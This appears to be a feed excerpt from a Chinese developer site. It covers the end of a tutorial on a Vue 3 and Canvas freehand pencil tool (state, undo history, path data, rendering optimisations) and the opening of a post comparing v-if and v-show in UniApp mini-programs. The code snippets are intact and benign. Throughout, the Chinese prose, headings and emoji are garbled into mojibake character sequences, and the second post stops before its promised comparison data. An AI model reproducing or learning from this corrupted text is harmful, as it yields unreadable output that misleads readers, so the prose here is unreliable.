  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
  
  <span class="hljs-keyword">return</span> {
    drawingActive,
    onMouseDown,
    onMouseMove,
    onMouseUp
  }
}
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>âœ… ä»£ç ç»„ç»‡æ¸…æ™°ï¼Œæ˜“äºç»´æŠ¤</li>
<li>âœ… åŠŸèƒ½ç‹¬ç«‹ï¼Œä¾¿äºæµ‹è¯•</li>
<li>âœ… å¯å¤ç”¨æ€§å¼ºï¼Œæ˜“äºæ‰©å±•</li>
</ul>
<h4 data-id="heading-16">2. çŠ¶æ€ç®¡ç†</h4>
<p>ä½¿ç”¨å“åº”å¼çŠ¶æ€ç®¡ç†ç»˜åˆ¶çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> drawingActive = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)  <span class="hljs-comment">// æ˜¯å¦æ­£åœ¨ç»˜åˆ¶</span>
<span class="hljs-keyword">const</span> lastPoint = <span class="hljs-title function_">ref</span>({ <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> })  <span class="hljs-comment">// ä¸Šä¸€ä¸ªç‚¹</span>

<span class="hljs-comment">// åœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­æ›´æ–°çŠ¶æ€</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) {
  drawingActive.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  lastPoint.<span class="hljs-property">value</span> = { ...pos }
}
</code></pre>
<h4 data-id="heading-17">3. å†å²è®°å½•é›†æˆ</h4>
<p>å®Œæ•´çš„æ’¤é”€/é‡åšæ”¯æŒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) {
  history.<span class="hljs-property">value</span>.<span class="hljs-title function_">saveState</span>()  <span class="hljs-comment">// å¼€å§‹ç»˜åˆ¶å‰ä¿å­˜çŠ¶æ€</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span>) {
    elements.<span class="hljs-property">freeDrawElements</span>.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({ ...elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> })
    history.<span class="hljs-property">value</span>.<span class="hljs-title function_">saveState</span>()  <span class="hljs-comment">// ç»˜åˆ¶å®Œæˆåä¿å­˜çŠ¶æ€</span>
  }
}
</code></pre>
<h4 data-id="heading-18">4. è·¯å¾„æ•°æ®ç»“æ„</h4>
<p>æ¸…æ™°çš„æ•°æ®ç»“æ„è®¾è®¡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">type</span>: <span class="hljs-string">'freedraw'</span>,
  <span class="hljs-attr">points</span>: [
    { <span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">200</span> },
    { <span class="hljs-attr">x</span>: <span class="hljs-number">105</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">205</span> },
    <span class="hljs-comment">// ... æ›´å¤šç‚¹</span>
  ],
  <span class="hljs-attr">color</span>: <span class="hljs-string">'#222222'</span>,
  <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span>,
  <span class="hljs-attr">opacity</span>: <span class="hljs-number">100</span>,
  <span class="hljs-attr">id</span>: <span class="hljs-string">'1234567890'</span>
}
</code></pre>
<p><strong>è®¾è®¡è€ƒè™‘</strong>:</p>
<ul>
<li>âœ… ä½¿ç”¨ç‚¹æ•°ç»„å­˜å‚¨è·¯å¾„ï¼Œä¾¿äºåºåˆ—åŒ–</li>
<li>âœ… åŒ…å«æ‰€æœ‰å¿…è¦å±æ€§ï¼Œæ”¯æŒå®Œæ•´æ¢å¤</li>
<li>âœ… å”¯ä¸€ ID ä¾¿äºå…ƒç´ ç®¡ç†</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å®Œæ•´å®ç°ä»£ç è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/usePencilTool.js</a></p>
</blockquote>
<h3 data-id="heading-19">âš¡ æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-20">1. å»¶è¿Ÿè¾¹ç•Œæ›´æ–°</h4>
<p>ç»˜åˆ¶è¿‡ç¨‹ä¸­ä¸æ›´æ–°è¾¹ç•Œï¼Œå‡å°‘è®¡ç®—å¼€é”€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»˜åˆ¶è¿‡ç¨‹ä¸­ï¼šä¸æ›´æ–°è¾¹ç•Œ</span>
<span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">false</span>)

<span class="hljs-comment">// ç»˜åˆ¶å®Œæˆï¼šæ›´æ–°è¾¹ç•Œ</span>
<span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">true</span>)
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœ</strong>:</p>
<ul>
<li>âš¡ å‡å°‘è¾¹ç•Œè®¡ç®—æ¬¡æ•°</li>
<li>âš¡ æå‡ç»˜åˆ¶æµç•…åº¦</li>
<li>âš¡ é™ä½ CPU å ç”¨</li>
</ul>
<h4 data-id="heading-21">2. ç‚¹æ•°ç»„ä¼˜åŒ–</h4>
<p>åˆç†æ§åˆ¶ç‚¹æ•°ç»„å¤§å°ï¼Œé¿å…å†…å­˜å ç”¨è¿‡å¤§ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åªåœ¨ç»˜åˆ¶å®Œæˆæ—¶æ·»åŠ åˆ°å…ƒç´ æ•°ç»„</span>
<span class="hljs-keyword">if</span> (elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span>) {
  elements.<span class="hljs-property">freeDrawElements</span>.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({ ...elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> })
}
</code></pre>
<h4 data-id="heading-22">3. æ¸²æŸ“ä¼˜åŒ–</h4>
<p>ä½¿ç”¨ Canvas çš„é«˜æ•ˆç»˜åˆ¶ APIï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ fill è€Œé strokeï¼Œæ•ˆæœæ›´è‡ªç„¶</span>
ctx.<span class="hljs-property">fillStyle</span> = element.<span class="hljs-property">color</span>
ctx.<span class="hljs-title function_">fill</span>()
</code></pre>
<h4 data-id="heading-23">4. çŠ¶æ€æ¸…ç†</h4>
<p>åŠæ—¶æ¸…ç†ä¸´æ—¶çŠ¶æ€ï¼Œé¿å…å†…å­˜æ³„æ¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// å®Œæˆç»˜åˆ¶åæ¸…ç†ä¸´æ—¶è·¯å¾„</span>
  elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
  drawingActive.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}
</code></pre>
<h3 data-id="heading-24">ğŸ“Š å®ç°æµç¨‹å›¾</h3>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·æŒ‰ä¸‹é¼ æ ‡
<span class="hljs-code">    â†“
åˆ›å»ºæ–°çš„ç”»ç¬”è·¯å¾„
    â”œâ”€ åˆå§‹åŒ–ç‚¹æ•°ç»„
    â”œâ”€ è®¾ç½®é¢œè‰²ã€å¤§å°ã€é€æ˜åº¦
    â””â”€ ä¿å­˜å†å²çŠ¶æ€
    â†“
é¼ æ ‡ç§»åŠ¨
    â”œâ”€ æ·»åŠ ç‚¹åˆ°è·¯å¾„
    â””â”€ å®æ—¶æ¸²æŸ“ï¼ˆä¸æ›´æ–°è¾¹ç•Œï¼‰
    â†“
ç»§ç»­ç§»åŠ¨...
    â†“
ç”¨æˆ·é‡Šæ”¾é¼ æ ‡
    â”œâ”€ æ£€æŸ¥è·¯å¾„æœ‰æ•ˆæ€§ï¼ˆè‡³å°‘2ä¸ªç‚¹ï¼‰
    â”œâ”€ æ·»åŠ åˆ°å…ƒç´ æ•°ç»„
    â”œâ”€ æ›´æ–°è¾¹ç•Œ
    â””â”€ ä¿å­˜å†å²çŠ¶æ€
    â†“
å®Œæˆç»˜åˆ¶
</span></code></pre>
<h3 data-id="heading-25">ğŸ“ æ€»ç»“</h3>
<p>ç”»ç¬”å·¥å…·è™½ç„¶çœ‹ä¼¼ç®€å•ï¼Œä½†å®ç°è¿‡ç¨‹ä¸­æ¶‰åŠäº†å¤šä¸ªæŠ€æœ¯é¢†åŸŸï¼š</p>
<ul>
<li>ğŸ¨ <strong>ç®—æ³•åº”ç”¨</strong>: perfect-freehand ç®—æ³•çš„é›†æˆå’Œä½¿ç”¨</li>
<li>ğŸ“Š <strong>çŠ¶æ€ç®¡ç†</strong>: å“åº”å¼çŠ¶æ€çš„ç®¡ç†å’ŒåŒæ­¥</li>
<li>âš¡ <strong>æ€§èƒ½ä¼˜åŒ–</strong>: å®æ—¶æ¸²æŸ“çš„æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</li>
<li>ğŸ”„ <strong>å†å²è®°å½•</strong>: å®Œæ•´çš„æ’¤é”€/é‡åšæ”¯æŒ</li>
<li>ğŸ—ï¸ <strong>æ¶æ„è®¾è®¡</strong>: æ¨¡å—åŒ–çš„ Composables æ¶æ„</li>
</ul>
<p>é€šè¿‡æ¨¡å—åŒ–çš„ Composables æ¶æ„ï¼Œæˆ‘ä»¬å°†ç”»ç¬”å·¥å…·å°è£…ä¸ºç‹¬ç«‹çš„ <code>usePencilTool</code>ï¼Œå®ç°äº†é«˜å†…èšã€ä½è€¦åˆçš„ä»£ç ç»“æ„ï¼Œä¾¿äºç»´æŠ¤å’Œæ‰©å±•ã€‚</p>
<h4 data-id="heading-26">ğŸš€ ä¸‹ä¸€æ­¥æ¢ç´¢</h4>
<p>å¦‚æœä½ æƒ³æ·±å…¥äº†è§£ï¼š</p>
<ul>
<li>ğŸ“– <strong>å®Œæ•´ä»£ç å®ç°</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">usePencilTool.js</a></li>
<li>ğŸ¨ <strong>æ¸²æŸ“ç³»ç»Ÿ</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">useRender.js</a></li>
<li>ğŸ—ºï¸ <strong>åœ°å›¾è®¾è®¡å·¥å…·</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fviews%2FMapDesign.vue" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/views/MapDesign.vue" ref="nofollow noopener noreferrer">MapDesign.vue</a></li>
<li>ğŸ“š <strong>perfect-freehand</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsteveruizok%2Fperfect-freehand" target="_blank" title="https://github.com/steveruizok/perfect-freehand" ref="nofollow noopener noreferrer">perfect-freehand æ–‡æ¡£</a></li>
</ul>
<hr/>
<h4 data-id="heading-27">ğŸ“š ç›¸å…³é“¾æ¥</h4>
<ul>
<li><strong>é¡¹ç›®åœ°å€</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi" ref="nofollow noopener noreferrer">GitHub - 51mazi</a>ï¼Œç»™ä¸ª Star å“¦~</li>
<li><strong>ç”»ç¬”å·¥å…·ä»£ç </strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/usePencilTool.js</a></li>
<li><strong>æ¸²æŸ“å‡½æ•°</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useRender.js</a></li>
<li><strong>perfect-freehand åº“</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsteveruizok%2Fperfect-freehand" target="_blank" title="https://github.com/steveruizok/perfect-freehand" ref="nofollow noopener noreferrer">perfect-freehand</a></li>
<li><strong>æŠ€æœ¯æ ˆ</strong>: Vue 3 + Canvas + perfect-freehand + Composables</li>
</ul>
<h4 data-id="heading-28">ğŸ·ï¸ æ ‡ç­¾</h4>
<p><code>#Canvas</code> <code>#perfect-freehand</code> <code>#ç”»ç¬”å·¥å…·</code> <code>#å¹³æ»‘ç»˜åˆ¶</code> <code>#å®æ—¶æ¸²æŸ“</code> <code>#Vue3</code> <code>#å‰ç«¯å¼€å‘</code> <code>#æ€§èƒ½ä¼˜åŒ–</code> <code>#Composables</code></p>
<hr/>
<blockquote>
<p>ğŸ’¡ <strong>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œè¯·ç»™ä¸ª â­ï¸ æ”¯æŒä¸€ä¸‹ï¼</strong></p>
<p>ğŸ’¡ <strong>æƒ³æ·±å…¥äº†è§£å®ç°ç»†èŠ‚ï¼Ÿæ¬¢è¿æŸ¥çœ‹ GitHub ä¸Šå¯¹åº”çš„ä»£ç æ–‡ä»¶ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰è¯¦ç»†çš„æ³¨é‡Šè¯´æ˜ï¼</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆæ”¾å¼ƒ v-if é€‰æ‹© v-showï¼Ÿä¸ºä»€ä¹ˆç»„ä»¶è¶Šç”¨è¶Šå¡ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589126814829576244</link>    <guid>https://juejin.cn/post/7589126814829576244</guid>    <pubDate>2025-12-29T14:08:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126814829576244" data-draft-id="7589110783146541090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆæ”¾å¼ƒ v-if é€‰æ‹© v-showï¼Ÿä¸ºä»€ä¹ˆç»„ä»¶è¶Šç”¨è¶Šå¡ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T14:08:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="heyCHEEMS"/> <meta itemprop="url" content="https://juejin.cn/user/4308367489378780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆæ”¾å¼ƒ v-if é€‰æ‹© v-showï¼Ÿä¸ºä»€ä¹ˆç»„ä»¶è¶Šç”¨è¶Šå¡ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4308367489378780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    heyCHEEMS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:08:41.000Z" title="Mon Dec 29 2025 14:08:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç”¨ UniApp å¼€å‘ä¸€ä¸ªæŠ˜å é¢æ¿ç»„ä»¶ï¼ˆCollapseï¼‰æ—¶ï¼Œä¸ºäº†è¿½æ±‚æ€§èƒ½ï¼Œæˆ‘ç†æ‰€å½“ç„¶åœ°ç»™å†…å®¹åŒºåŸŸåŠ ä¸Šäº† <code>v-if</code>ã€‚æˆ‘æƒ³ï¼š <strong>â€œåªæœ‰ç‚¹å¼€çš„æ—¶å€™æ‰åˆ›å»º DOMï¼Œä¸ç‚¹å¼€å°±ä¸æ¸²æŸ“ï¼Œè¿™ä¸å°±æ˜¯æœ€å®Œç¾çš„æŒ‰éœ€åŠ è½½å—ï¼Ÿâ€</strong></p>
<p>ç„¶è€Œï¼Œå½“æˆ‘æ‰“å¼€å¾®ä¿¡å¼€å‘è€…å·¥å…·çš„è°ƒè¯•å™¨æ—¶ï¼Œå‚»çœ¼äº†ï¼š</p>
<p>æˆ‘æ¯ç‚¹å¼€ä¸€ä¸ªæ’æ§½å†…å®¹ï¼ŒDOM æ ‘é‡Œå°±ä¼šè«åå…¶å¦™å¤šå‡ºå¥½å‡ ä¸ªå¥‡æ€ªçš„èŠ‚ç‚¹ï¼ˆæ¯”å¦‚ collapse-item-1-1 è¿™ç§ï¼‰ã€‚éšç€ç‚¹å‡»æ¬¡æ•°å¢å¤šï¼Œå°ç¨‹åºå¼€å§‹å˜å¾—å¡é¡¿ï¼ŒçœŸæœºæµ‹è¯•ç”šè‡³å‡ºç°äº†å†…å­˜æº¢å‡ºå¯¼è‡´çš„é—ªé€€ã€‚</p>
<hr/>
<h3 data-id="heading-0">1. â€œå‡é”€æ¯â€ï¼šæ¶ˆå¤±çš„å†…å®¹ï¼Œç•™ä¸‹çš„â€œå‘â€</h3>
<p>åœ¨ H5 å¼€å‘ä¸­ï¼Œ<code>v-if="false"</code> ä¼šæŠŠ DOM å½»åº•åˆ æ‰ã€‚ä½†åœ¨<strong>å°ç¨‹åº</strong>é‡Œï¼Œå› ä¸ºæ’æ§½ï¼ˆSlotï¼‰çš„å®ç°æœºåˆ¶ï¼Œæƒ…å†µå‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<ul>
<li>
<p><strong>å°ç¨‹åºæ’æ§½æ˜¯â€œé™æ€â€çš„</strong>ï¼šå¾®ä¿¡å°ç¨‹åºåŸç”Ÿæ¡†æ¶è¦æ±‚æ’æ§½åï¼ˆ<code>slot name</code>ï¼‰åœ¨ç¼–è¯‘é˜¶æ®µå¿…é¡»å›ºå®šã€‚</p>
</li>
<li>
<p><strong>UniApp çš„åŠ¨æ€æ¨¡æ‹Ÿ</strong>ï¼šä¸ºäº†æ”¯æŒ Vue çš„åŠ¨æ€æ’æ§½åï¼ˆå¦‚ <code>:name="'content-' + index"</code>ï¼‰ï¼ŒUniApp ç¼–è¯‘å™¨åœ¨ç”Ÿæˆ <code>.wxml</code> æ—¶ï¼Œä¼šé¢„å…ˆç”Ÿæˆå¤§é‡çš„é™æ€å ä½ç¬¦æ¥å»ºç«‹æ˜ å°„å…³ç³»ã€‚</p>
</li>
<li>
<p><strong>å¹½çµèŠ‚ç‚¹çš„è¯ç”Ÿ</strong>ï¼šå¦‚æœä½ åœ¨æ’æ§½<strong>å¤–å±‚</strong>å¥— <code>v-if</code>ï¼Œæ¯å½“åˆ‡æ¢çŠ¶æ€ï¼Œå°ç¨‹åºåº•å±‚æ— æ³•çœŸæ­£â€œæ‹”æ‰â€å·²ç»å­˜åœ¨çš„ Slot å®¹å™¨ã€‚ä¸ºäº†ä¿è¯ç´¢å¼•ä¸ä¹±ï¼Œç¼–è¯‘å™¨ä¼šäº§ç”Ÿå†—ä½™çš„æ˜ å°„èŠ‚ç‚¹ï¼ˆå¦‚ <code>item-1-1</code>ï¼‰ã€‚ä½ ç‚¹å¾—è¶Šå¤šï¼Œåå°ç§¯å‹çš„â€œç©ºæ¡†å­â€å°±è¶Šå£®è§‚ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-1">2. ä¸ºä»€ä¹ˆ v-show åè€Œæˆäº†æ•‘æ˜Ÿï¼Ÿ</h3>
<p><code>v-show</code> åœ¨å°ç¨‹åºé‡Œä¼šè¢«ç¼–è¯‘æˆ <code>hidden</code> å±æ€§ï¼ˆç›¸å½“äº <code>display: none</code>ï¼‰ã€‚</p>
<ul>
<li><strong>ç»“æ„ç¨³å®š</strong>ï¼šå®ƒåœ¨åˆå§‹åŒ–æ—¶å°±æŠŠæ‰€æœ‰çš„â€œæ¡†å­â€å‡†å¤‡å¥½ï¼Œä¸æ˜¾ç¤ºçš„å°±è—èµ·æ¥ã€‚</li>
<li><strong>ä¸æŠ˜è…¾ CPU</strong>ï¼šä¸éœ€è¦åå¤åˆ›å»ºå’Œé”€æ¯èŠ‚ç‚¹ã€‚è™½ç„¶åˆå§‹åŠ è½½å¤šäº†ä¸€ç‚¹ç‚¹å¼€é”€ï¼Œä½†å¯¹äºå°ç¨‹åºè¿™ç§â€œåˆ›å»ºæˆæœ¬é«˜ã€é”€æ¯ä¸å½»åº•â€çš„ç¯å¢ƒï¼Œ<strong>ç¨³ä½ DOM ç»“æ„</strong>æ‰æ˜¯ä¿å‘½çš„å…³é”®ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-2">3. æ€§èƒ½å·®è·æœ‰å¤šå¤§ï¼Ÿ</h3>
<p>åœ¨ä¸€ç»„åŒ…å« 50 ä¸ªå¤æ‚å†…å®¹çš„åˆ—è¡¨æµ‹è¯•æ•°æ®å¯¹æ¯”ï¼š</p>





























